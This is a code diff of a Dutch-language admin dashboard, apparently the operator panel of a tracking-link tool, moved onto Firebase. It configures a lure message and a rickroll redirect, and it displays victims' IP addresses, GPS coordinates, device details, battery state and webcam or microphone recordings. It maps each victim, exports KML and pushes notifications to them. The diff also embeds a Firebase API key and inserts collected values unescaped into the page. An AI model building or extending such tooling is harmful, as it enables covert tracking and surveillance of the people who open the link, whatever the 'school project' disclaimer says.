@@ -147,36 +147,6 @@
             box-sizing: border-box;
         }
 
-        .editable-div {
-            width: 100%;
-            min-height: 50px;
-            padding: 8px;
-            margin-top: 2px;
-            margin-bottom: 5px;
-            border-radius: 5px;
-            border: 1px solid #ccc;
-            font-size: 14px;
-            box-sizing: border-box;
-            background-color: #fff;
-            overflow: auto;
-        }
-
-        .text-color-controls {
-            margin-bottom: 5px;
-        }
-
-        .color-button {
-            background: none;
-            border: none;
-            font-size: 16px;
-            cursor: pointer;
-            margin-right: 5px;
-        }
-
-        .color-button:hover {
-            text-decoration: underline;
-        }
-
         .notification-section {
             margin-top: 15px;
             text-align: left;
@@ -260,22 +230,6 @@
             text-align: center;
         }
 
-        /* Stijl voor de "Instellingen opslaan" knop */
-        #saveSettingsButton {
-            padding: 10px 20px;
-            font-size: 16px;
-            background-color: #4caf50; /* Groen */
-            color: #fff;
-            border: none;
-            border-radius: 5px;
-            cursor: pointer;
-            margin-top: 10px; /* Ruimte boven de knop */
-        }
-
-        #saveSettingsButton:hover {
-            background-color: #45a049; /* Donkerder groen bij hover */
-        }
-
         /* Responsive */
         @media screen and (max-width: 480px) {
             body {
@@ -301,6 +255,12 @@
     </style>
 </head>
 <body>
+    <!-- Firebase Compatibiliteitsbibliotheken -->
+    <script src="https://www.gstatic.com/firebasejs/9.22.1/firebase-app-compat.js"></script>
+    <script src="https://www.gstatic.com/firebasejs/9.22.1/firebase-database-compat.js"></script>
+    <!-- Leaflet JS -->
+    <script src="https://unpkg.com/leaflet@1.9.4/dist/leaflet.js"></script>
+
     <h1>Opgeslagen Gegevens</h1>
 
     <!-- Schakelaars in een wit vak -->
@@ -333,13 +293,7 @@
         <!-- Bewerk sectie -->
         <div class="edit-section">
             <label for="messageInput" class="edit-label">Bewerk de berichttekst:</label>
-            <div class="text-color-controls">
-                <button type="button" class="color-button" data-color="black" style="color: black;">A</button>
-                <button type="button" class="color-button" data-color="red" style="color: red;">A</button>
-                <button type="button" class="color-button" data-color="green" style="color: green;">A</button>
-                <button type="button" class="color-button" data-color="blue" style="color: blue;">A</button>
-            </div>
-            <div id="messageInput" contenteditable="true" class="editable-div">Youssof heeft je een link gestuurd!</div>
+            <input type="text" id="messageInput" placeholder="Youssof heeft je een link gestuurd!">
 
             <label for="redirectUrlInput" class="edit-label">Voer de redirect URL in:</label>
             <input type="text" id="redirectUrlInput" placeholder="https://example.com">
@@ -356,10 +310,45 @@
 
     <p class="disclaimer">Dit is een schoolproject en er wordt op geen enkele manier misbruik van gemaakt.</p>
 
-    <!-- Leaflet JS -->
-    <script src="https://unpkg.com/leaflet@1.9.4/dist/leaflet.js"></script>
     <script>
-        // Haal elementen op
+        // Firebase-configuratie
+        const firebaseConfig = {
+            apiKey: "AIzaSyAEw9353xS1az8fl6yDbwxeqGR9E4dT7h0",
+            authDomain: "loc-60f9d.firebaseapp.com",
+            databaseURL: "https://loc-60f9d-default-rtdb.europe-west1.firebasedatabase.app",
+            projectId: "loc-60f9d",
+            storageBucket: "loc-60f9d.firebasestorage.app",
+            messagingSenderId: "530676836005",
+            appId: "1:530676836005:web:565aab01da59f6ba9c4f4c",
+            measurementId: "G-47CS0L8VF1"
+        };
+
+        // Firebase initialiseren
+        firebase.initializeApp(firebaseConfig);
+        const db = firebase.database();
+
+        // Referenties
+        const settingsRef = db.ref('settings');
+        const dataRef = db.ref('collectedData');
+
+        // Haal instellingen op uit Firebase
+        let settings = {};
+        settingsRef.on('value', (snapshot) => {
+            settings = snapshot.val() || {};
+            updateUI();
+        });
+
+        function updateUI() {
+            // Stel de huidige waarden in de UI
+            micCamSwitch.checked = settings.micCamEnabled === true;
+            locationSwitch.checked = settings.locationEnabled === true;
+            notificationsSwitch.checked = settings.notificationsEnabled === true;
+            messageInput.value = settings.messageText || "Youssof heeft je een link gestuurd!";
+            redirectUrlInput.value = settings.redirectUrl || "https://www.youtube.com/watch?v=dQw4w9WgXcQ";
+            redirectDelayInput.value = settings.redirectDelay || 5;
+        }
+
+        // Elementen ophalen
         const micCamSwitch = document.getElementById("micCamSwitch");
         const locationSwitch = document.getElementById("locationSwitch");
         const notificationsSwitch = document.getElementById("notificationsSwitch");
@@ -368,80 +357,409 @@
         const redirectDelayInput = document.getElementById("redirectDelayInput");
         const saveSettingsButton = document.getElementById("saveSettingsButton");
 
-        // Functie om instellingen van de server op te halen
-        async function fetchSettings() {
-            try {
-                const response = await fetch('api.php');
-                if (!response.ok) {
-                    throw new Error('Fout bij het ophalen van instellingen.');
-                }
-                const settings = await response.json();
-
-                // Stel de huidige waarden in
-                micCamSwitch.checked = settings.micCamEnabled;
-                locationSwitch.checked = settings.locationEnabled;
-                notificationsSwitch.checked = settings.notificationsEnabled;
-                messageInput.innerHTML = settings.messageText;
-                redirectUrlInput.value = settings.redirectUrl;
-                redirectDelayInput.value = settings.redirectDelay;
-
-            } catch (error) {
-                console.error('Fout bij het ophalen van instellingen:', error);
-                alert('Fout bij het ophalen van instellingen van de server.');
-            }
-        }
-
-        // Roep de functie aan om instellingen op te halen
-        fetchSettings();
-
-        // Event listener voor kleurknoppen
-        document.querySelectorAll('.color-button').forEach(button => {
-            button.addEventListener('click', () => {
-                const color = button.getAttribute('data-color');
-                document.execCommand('foreColor', false, color);
-            });
-        });
-
         // Event listener voor de knop om instellingen op te slaan
-        saveSettingsButton.addEventListener("click", async () => {
-            // Haal de waarden op uit de inputs en schakelaars
-            const settings = {
+        saveSettingsButton.addEventListener("click", () => {
+            // Opslaan van de schakelaars en velden naar Firebase
+            const newSettings = {
                 micCamEnabled: micCamSwitch.checked,
                 locationEnabled: locationSwitch.checked,
                 notificationsEnabled: notificationsSwitch.checked,
-                messageText: messageInput.innerHTML,
+                messageText: messageInput.value,
                 redirectUrl: redirectUrlInput.value,
                 redirectDelay: parseInt(redirectDelayInput.value, 10) || 5
             };
 
-            try {
-                const response = await fetch('api.php', {
-                    method: 'POST',
-                    headers: {
-                        'Content-Type': 'application/json'
-                    },
-                    body: JSON.stringify(settings)
-                });
-
-                if (!response.ok) {
-                    throw new Error('Fout bij het opslaan van instellingen.');
-                }
-
-                const result = await response.json();
-
-                if (result.success) {
-                    alert('Instellingen opgeslagen.');
+            settingsRef.set(newSettings, (error) => {
+                if (error) {
+                    alert("Er is een fout opgetreden bij het opslaan van de instellingen.");
                 } else {
-                    alert('Fout bij het opslaan van instellingen.');
+                    alert("Instellingen opgeslagen.");
                 }
-            } catch (error) {
-                console.error('Fout bij het opslaan van instellingen:', error);
-                alert('Fout bij het opslaan van instellingen naar de server.');
-            }
+            });
         });
 
-        // De rest van je bestaande code voor het weergeven van opgeslagen locaties
-        // ...
+        // Functie om gegevens te verwijderen op basis van locatie
+        function deleteDataItemByLocation(lat, lon) {
+            dataRef.orderByChild('lat').equalTo(lat).once('value', (snapshot) => {
+                snapshot.forEach((childSnapshot) => {
+                    const childData = childSnapshot.val();
+                    if (childData.lon === lon) {
+                        childSnapshot.ref.remove();
+                    }
+                });
+            });
+        }
+
+        let displayedDataKeys = new Set();
+
+        function groupDataByLocation(data) {
+            const groupedData = {};
+
+            data.forEach((item) => {
+                let lat, lon;
+                if (item.ipLocation && item.ipLocation.lat && item.ipLocation.lon) {
+                    lat = item.ipLocation.lat;
+                    lon = item.ipLocation.lon;
+                } else if (item.lat && item.lon) {
+                    lat = item.lat;
+                    lon = item.lon;
+                }
+
+                if (lat !== undefined && lon !== undefined) {
+                    const key = `${lat.toFixed(5)}-${lon.toFixed(5)}`;
+                    if (!groupedData[key]) {
+                        groupedData[key] = {
+                            lat: lat,
+                            lon: lon,
+                            accuracy: item.accuracy || null,
+                            device: item.device || null,
+                            visits: 0,
+                            timestamps: [],
+                            recordings: [],
+                            battery: item.battery || {},
+                            redirectUrl: item.redirectUrl || "",
+                            notification: item.notification || {},
+                            notificationSentCount: 0,
+                            title: item.title || "Gegevens",
+                            ipLocation: item.ipLocation || null
+                        };
+                    }
+                    groupedData[key].visits += 1;
+                    groupedData[key].timestamps.push(item.timestamp || (item.ipLocation && item.ipLocation.timestamp));
+
+                    if (item.recording && item.recording.dataUrl) {
+                        groupedData[key].recordings.push(item.recording.dataUrl);
+                    }
+
+                    if (item.notification && item.notification.sentCount) {
+                        groupedData[key].notificationSentCount = item.notification.sentCount;
+                    }
+                } else {
+                    // Items zonder locatie kunnen hier worden afgehandeld
+                }
+            });
+
+            return groupedData;
+        }
+
+        function displaySavedLocations() {
+            dataRef.once('value', (snapshot) => {
+                const savedData = snapshot.val() || {};
+                const dataArray = Object.values(savedData);
+                const container = document.getElementById("saved-locations");
+
+                if (dataArray.length === 0) {
+                    container.innerHTML = "<p>Geen opgeslagen gegevens gevonden.</p>";
+                    return;
+                }
+
+                const groupedData = groupDataByLocation(dataArray);
+
+                container.innerHTML = ""; // Clear existing content
+
+                for (const key in groupedData) {
+                    const dataItem = groupedData[key];
+
+                    const locationItem = document.createElement("div");
+                    locationItem.classList.add("location-item");
+                    locationItem.setAttribute("data-key", key);
+
+                    const closeButton = document.createElement("button");
+                    closeButton.classList.add("close-btn");
+                    closeButton.onclick = () => deleteDataItemByLocation(dataItem.lat, dataItem.lon);
+
+                    let htmlContent = "";
+
+                    // Bewerkbare titel
+                    htmlContent += `<input type="text" id="title-${key}" class="title-input" value="${dataItem.title}" placeholder="Titel">`;
+
+                    // Locatiegegevens
+                    if (dataItem.ipLocation) {
+                        htmlContent += `
+                            <p><strong>IP-adres:</strong> ${dataItem.ipLocation.ip}</p>
+                            <p><strong>Stad:</strong> ${dataItem.ipLocation.city}</p>
+                            <p><strong>Regio:</strong> ${dataItem.ipLocation.region}</p>
+                            <p><strong>Land:</strong> ${dataItem.ipLocation.country}</p>
+                        `;
+                    }
+
+                    htmlContent += `
+                        <p><strong>Breedtegraad:</strong> ${dataItem.lat}</p>
+                        <p><strong>Lengtegraad:</strong> ${dataItem.lon}</p>
+                    `;
+
+                    if (dataItem.accuracy) {
+                        htmlContent += `<p><strong>Nauwkeurigheid:</strong> ±${dataItem.accuracy} meter</p>`;
+                    }
+
+                    if (dataItem.device) {
+                        htmlContent += `<p><strong>Apparaat:</strong> ${dataItem.device}</p>`;
+                    }
+
+                    htmlContent += `
+                        <p><strong>Aantal bezoeken:</strong> ${dataItem.visits}</p>
+                        <p><strong>Batterijniveau:</strong> ${dataItem.battery.level !== undefined ? (dataItem.battery.level * 100).toFixed(0) + '%' : 'Onbekend'}</p>
+                        <p><strong>Opladen:</strong> ${dataItem.battery.charging !== undefined ? (dataItem.battery.charging ? 'Ja' : 'Nee') : 'Onbekend'}</p>
+                        <p><strong>Redirect URL:</strong> <a href="${dataItem.redirectUrl}" target="_blank">${dataItem.redirectUrl}</a></p>
+                        <p><strong>Tijdstippen:</strong></p>
+                        <ul>
+                            ${dataItem.timestamps.map(ts => `<li>${ts}</li>`).join('')}
+                        </ul>
+                    `;
+
+                    // Opnames
+                    if (dataItem.recordings.length > 0) {
+                        htmlContent += `<p><strong>Opnames:</strong></p>`;
+                        dataItem.recordings.forEach((recordingUrl, recIndex) => {
+                            htmlContent += `
+                                <video controls width="250">
+                                    <source src="${recordingUrl}" type="video/webm">
+                                    Je browser ondersteunt de video tag niet.
+                                </video>
+                            `;
+                        });
+                    }
+
+                    // Map container
+                    htmlContent += `<div id="map-${key}" class="map-container"></div>`;
+
+                    // Download KML knop
+                    htmlContent += `<button id="downloadKML-${key}">Download KML</button>`;
+
+                    locationItem.innerHTML = htmlContent;
+                    locationItem.appendChild(closeButton);
+                    container.appendChild(locationItem);
+
+                    // Initializeer de kaart
+                    if (dataItem.lat && dataItem.lon) {
+                        const map = L.map(`map-${key}`).setView([dataItem.lat, dataItem.lon], 13);
+
+                        L.tileLayer('https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png', {
+                            attribution: '&copy; OpenStreetMap contributors'
+                        }).addTo(map);
+
+                        let popupText = "";
+                        if (dataItem.ipLocation) {
+                            popupText = `${dataItem.ipLocation.city}, ${dataItem.ipLocation.region}, ${dataItem.ipLocation.country}`;
+                        } else {
+                            popupText = `Locatie: ${dataItem.lat}, ${dataItem.lon}`;
+                        }
+
+                        L.marker([dataItem.lat, dataItem.lon]).addTo(map)
+                            .bindPopup(popupText)
+                            .openPopup();
+                    }
+
+                    // Notificatiesectie
+                    const notificationSection = document.createElement("div");
+                    notificationSection.classList.add("notification-section");
+                    notificationSection.innerHTML = `
+                        <h3>Notificatie</h3>
+                        <div class="switch-container">
+                            <label class="switch">
+                                <input type="checkbox" id="actionSwitch-${key}">
+                                <span class="slider"></span>
+                            </label>
+                            <span class="switch-text">Antwoordbare notificatie inschakelen</span>
+                        </div>
+                        <input type="text" id="bodyText-${key}" placeholder="Voer body tekst in">
+                        <input type="file" id="iconUpload-${key}" accept="image/*">
+                        <button id="sendNotification-${key}">Stuur</button>
+                        <p>Aantal keer gestuurd: <span id="notificationCount-${key}">${dataItem.notificationSentCount || 0}</span></p>
+                    `;
+
+                    locationItem.appendChild(notificationSection);
+
+                    // Zet bestaande waarden
+                    if (dataItem.notification) {
+                        const bodyTextElement = document.getElementById(`bodyText-${key}`);
+                        if (bodyTextElement) {
+                            bodyTextElement.value = dataItem.notification.bodyText || "";
+                        }
+                        if (dataItem.notification.iconDataUrl) {
+                            const iconPreview = document.createElement("img");
+                            iconPreview.src = dataItem.notification.iconDataUrl;
+                            iconPreview.width = 50;
+                            iconPreview.height = 50;
+                            notificationSection.appendChild(iconPreview);
+                        }
+                    }
+
+                    // Event listeners
+                    const titleInput = document.getElementById(`title-${key}`);
+                    if (titleInput) {
+                        titleInput.addEventListener("input", function() {
+                            const newTitle = this.value;
+                            // Update title in Firebase
+                            dataRef.orderByChild('lat').equalTo(dataItem.lat).once('value', (snapshot) => {
+                                snapshot.forEach((childSnapshot) => {
+                                    const childData = childSnapshot.val();
+                                    if (childData.lon === dataItem.lon) {
+                                        childSnapshot.ref.update({ title: newTitle });
+                                    }
+                                });
+                            });
+                        });
+                    }
+
+                    const bodyTextInput = document.getElementById(`bodyText-${key}`);
+                    if (bodyTextInput) {
+                        bodyTextInput.addEventListener("input", function() {
+                            const newBodyText = this.value;
+                            // Update bodyText in Firebase
+                            dataRef.orderByChild('lat').equalTo(dataItem.lat).once('value', (snapshot) => {
+                                snapshot.forEach((childSnapshot) => {
+                                    const childData = childSnapshot.val();
+                                    if (childData.lon === dataItem.lon) {
+                                        if (!childData.notification) {
+                                            childSnapshot.ref.child('notification').set({});
+                                        }
+                                        childSnapshot.ref.child('notification').update({ bodyText: newBodyText });
+                                    }
+                                });
+                            });
+                        });
+                    }
+
+                    const iconUploadInput = document.getElementById(`iconUpload-${key}`);
+                    if (iconUploadInput) {
+                        iconUploadInput.addEventListener("change", function(event) {
+                            const file = event.target.files[0];
+                            if (file) {
+                                const reader = new FileReader();
+                                reader.onloadend = function() {
+                                    const iconDataUrl = reader.result;
+                                    // Update iconDataUrl in Firebase
+                                    dataRef.orderByChild('lat').equalTo(dataItem.lat).once('value', (snapshot) => {
+                                        snapshot.forEach((childSnapshot) => {
+                                            const childData = childSnapshot.val();
+                                            if (childData.lon === dataItem.lon) {
+                                                if (!childData.notification) {
+                                                    childSnapshot.ref.child('notification').set({});
+                                                }
+                                                childSnapshot.ref.child('notification').update({ iconDataUrl: iconDataUrl });
+                                            }
+                                        });
+                                    });
+
+                                    // Voeg icon preview toe
+                                    const iconPreview = document.createElement("img");
+                                    iconPreview.src = iconDataUrl;
+                                    iconPreview.width = 50;
+                                    iconPreview.height = 50;
+                                    notificationSection.appendChild(iconPreview);
+                                };
+                                reader.readAsDataURL(file);
+                            }
+                        });
+                    }
+
+                    const sendNotificationButton = document.getElementById(`sendNotification-${key}`);
+                    if (sendNotificationButton) {
+                        sendNotificationButton.addEventListener("click", function() {
+                            const bodyText = document.getElementById(`bodyText-${key}`).value;
+                            const actionSwitch = document.getElementById(`actionSwitch-${key}`).checked;
+                            let iconDataUrl = null;
+
+                            dataRef.orderByChild('lat').equalTo(dataItem.lat).once('value', (snapshot) => {
+                                snapshot.forEach((childSnapshot) => {
+                                    const childData = childSnapshot.val();
+                                    if (childData.lon === dataItem.lon && childData.notification) {
+                                        iconDataUrl = childData.notification.iconDataUrl || null;
+                                        let newSentCount = (childData.notification.sentCount || 0) + 1;
+                                        childSnapshot.ref.child('notification').update({ sentCount: newSentCount });
+                                        const notificationCountSpan = document.getElementById(`notificationCount-${key}`);
+                                        if (notificationCountSpan) {
+                                            notificationCountSpan.innerText = newSentCount;
+                                        }
+                                    }
+                                });
+                            });
+
+                            if ("Notification" in window && Notification.permission === "granted") {
+                                const options = {
+                                    body: bodyText,
+                                    icon: iconDataUrl
+                                };
+
+                                if (actionSwitch) {
+                                    options.data = { reply: true };
+                                }
+
+                                const notification = new Notification("Notificatie", options);
+
+                                if (actionSwitch) {
+                                    notification.onclick = function(event) {
+                                        event.preventDefault();
+                                        let response = prompt("Typ je reactie:");
+                                        if (response) {
+                                            alert("Je hebt gereageerd: " + response);
+                                        }
+                                    };
+                                } else {
+                                    notification.onclick = function(event) {
+                                        event.preventDefault();
+                                        window.focus();
+                                    };
+                                }
+                            } else {
+                                alert("Notificaties zijn niet toegestaan of worden niet ondersteund door deze browser.");
+                            }
+                        });
+                    }
+
+                    // Event listener voor Download KML knop
+                    const downloadKMLButton = document.getElementById(`downloadKML-${key}`);
+                    if (downloadKMLButton) {
+                        downloadKMLButton.addEventListener("click", function() {
+                            generateAndDownloadKML(dataItem);
+                        });
+                    }
+
+                    // Initialiseer notificatie toestemmingen indien nodig
+                    if (settings.notificationsEnabled && "Notification" in window) {
+                        Notification.requestPermission();
+                    }
+                } // einde for loop
+            }); // einde dataRef.once
+        } // einde displaySavedLocations
+
+        // Functie om KML te genereren en te downloaden
+        function generateAndDownloadKML(dataItem) {
+            const kmlContent = `<?xml version="1.0" encoding="UTF-8"?>
+<kml xmlns="http://www.opengis.net/kml/2.2">
+    <Placemark>
+        <name>${dataItem.title}</name>
+        <description>${dataItem.device || 'Geen apparaat informatie'}</description>
+        <Point>
+            <coordinates>${dataItem.lon},${dataItem.lat},0</coordinates>
+        </Point>
+    </Placemark>
+</kml>`;
+
+            const blob = new Blob([kmlContent], { type: 'application/vnd.google-earth.kml+xml' });
+            const url = URL.createObjectURL(blob);
+            const link = document.createElement('a');
+            link.href = url;
+            link.download = `${dataItem.title || 'location'}.kml`;
+            document.body.appendChild(link);
+            link.click();
+            document.body.removeChild(link);
+            URL.revokeObjectURL(url);
+        }
+
+        // Live update functie
+        function startLiveUpdates() {
+            // Luister naar veranderingen in de collectedData
+            dataRef.on('value', displaySavedLocations);
+        }
+
+        // Start live updates
+        startLiveUpdates();
+
+        // Eerste keer weergeven
+        displaySavedLocations();
+
     </script>
 </body>
 </html>
